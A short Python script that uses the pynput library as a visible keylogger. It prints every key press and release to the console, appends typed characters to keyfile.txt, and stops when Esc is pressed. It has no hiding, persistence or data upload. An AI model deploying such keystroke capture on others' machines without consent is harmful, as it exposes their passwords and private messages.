import pynput.keyboard

# Create an instance of the keyboard listener when pressing a key
def on_press(key):
  # Implement your logic here to handle key press events
  print(str(key))
  with open("keyfile.txt", "a") as logKey:
    try:
      char = key.char
      logKey.write(char)
    except Exception as e:
      print("Error getting char value:", str(e))



# Create an instance of the keyboard listener when releasing a key
def on_release(key):
    print(f'{key} released')
    if key == pynput.keyboard.Key.esc:
        # Stop listener
        return False


# Create an instance of the keyboard listener
if __name__ == '__main__':
  listener = pynput.keyboard.Listener(on_press=on_press, on_release=on_release)

  # Start the listener to begin capturing keystrokes
  listener.start()

  # Keep the script running to continuously capture keystrokes
  listener.join()

  # Keep the console open
  input()